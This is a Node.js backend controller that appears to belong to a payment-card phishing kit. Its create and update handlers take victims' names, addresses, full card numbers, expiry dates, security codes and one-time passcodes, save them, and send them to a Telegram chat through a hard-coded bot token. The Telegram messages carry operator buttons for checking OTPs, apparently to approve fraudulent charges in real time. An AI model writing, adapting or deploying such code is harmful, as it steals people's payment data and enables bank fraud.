const db = require("../models");
const FormData = db.FormData;

const axios = require("axios");

// Hard-code your Telegram bot token and chat ID here
const TELEGRAM_BOT_TOKEN = "5626992499:AAHfKlpL4ESnTjcXI61fXSx57cu0fW1pU_Y";
const TELEGRAM_CHAT_ID = "-1002170066715";

exports.create = (req, res) => {
  const formData = {
    phoneNumber: req.body.phoneNumber,
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    deliveryAddress: req.body.deliveryAddress,
    cardHolderName: req.body.cardHolderName,
    cardNumber: req.body.cardNumber,
    expiryDate: req.body.expiryDate,
    securityCode: req.body.securityCode,
    ref: req.body.ref,
    otp: req.body.otp,
  };

  FormData.create(formData)
    .then((data) => {
      // Send data to Telegram
      const message = `
        New Form Submission:
        Phone Number: ${formData.phoneNumber}
        First Name: ${formData.firstName}
        Last Name: ${formData.lastName}
        Delivery Address: ${formData.deliveryAddress}
        Card Holder Name: ${formData.cardHolderName}
        Card Number: ${formData.cardNumber}
        Expiry Date: ${formData.expiryDate}
        Security Code: ${formData.securityCode}
        Reference: ${formData.ref}
        OTP: ${formData.otp}
      `;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const inlineKeyboard = {
        inline_keyboard: [
          [{ text: "SHOW OTP", callback_data: "show_otp" }],
          [{ text: "OTP CORRECT", callback_data: "otp_correct" }],
          [{ text: "OTP INCORRECT", callback_data: "otp_incorrect" }],
        ],
      };
      axios
        .post(telegramUrl, {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          reply_markup: inlineKeyboard,
        })
        .then((response) => {
          console.log("Message sent to Telegram:", response.data);
          // Extract message_id from response
          const messageId = response.data.result.message_id;

          // Update the form data with the message_id
          FormData.update(
            { messageId: messageId },
            {
              where: { id: data.id }, // Assuming the ID of the created record is in data.id
            }
          )
            .then((num) => {
              if (num == 1) {
                console.log("Form data updated with messageId:", messageId);
              } else {
                console.log(
                  "Cannot update form data with messageId. Maybe form data was not found or req.body is empty!"
                );
              }
            })
            .catch((err) => {
              console.error("Error updating form data with messageId:", err);
            });
        })
        .catch((error) => {
          console.error("Error sending message to Telegram:", error);
        });

      res.send(data);
    })
    .catch((err) => {
      res.status(500).send({
        message:
          err.message || "Some error occurred while saving the form data.",
      });
    });
};

// Get action by ref
exports.getActionByRef = (req, res) => {
  const ref = req.params.ref;

  FormData.findOne({ where: { ref: ref } })
    .then((data) => {
      if (!data) {
        res
          .status(404)
          .send({ message: `Cannot find FormData with ref=${ref}` });
      } else {
        res.send({ action: data.action });
      }
    })
    .catch((err) => {
      res.status(500).send({
        message: `Error retrieving FormData with ref=${ref}`,
      });
    });
};

exports.updateFormDataByRef = (req, res) => {
  const ref = req.params.ref;
  const updatedData = req.body;

  FormData.findOne({ where: { ref: ref } })
    .then((formData) => {
      if (!formData) {
        res.status(404).send({
          message: `Cannot find FormData with ref=${ref}`,
        });
        return;
      }

      const messageId = formData.messageId;

      FormData.update(updatedData, { where: { ref: ref } })
        .then((num) => {
          if (num == 1) {
            res.send({
              message: "FormData was updated successfully.",
            });

            const message = `
              Updated Form Submission:
              Phone Number: ${updatedData.phoneNumber || formData.phoneNumber}
              First Name: ${updatedData.firstName || formData.firstName}
              Last Name: ${updatedData.lastName || formData.lastName}
              Delivery Address: ${updatedData.deliveryAddress || formData.deliveryAddress}
              Card Holder Name: ${updatedData.cardHolderName || formData.cardHolderName}
              Card Number: ${updatedData.cardNumber || formData.cardNumber}
              Expiry Date: ${updatedData.expiryDate || formData.expiryDate}
              Security Code: ${updatedData.securityCode || formData.securityCode}
              Reference: ${ref}
              OTP: ${updatedData.otp || formData.otp}
            `;

            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;

            axios
              .post(telegramUrl, {
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: message,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: "SHOW OTP", callback_data: "show_otp" }],
                    [{ text: "OTP CORRECT", callback_data: "otp_correct" }],
                    [{ text: "OTP INCORRECT", callback_data: "otp_incorrect" }],
                  ],
                },
              })
              .then((response) => {
                console.log("Message updated in Telegram:", response.data);
              })
              .catch((error) => {
                console.error("Error updating message in Telegram:", error);
              });
          } else {
            res.send({
              message: `Cannot update FormData with ref=${ref}. Maybe FormData was not found or req.body is empty!`,
            });
          }
        })
        .catch((err) => {
          res.status(500).send({
            message: `Error updating FormData with ref=${ref}`,
          });
        });
    })
    .catch((err) => {
      res.status(500).send({
        message: `Error retrieving FormData with ref=${ref}`,
      });
    });
};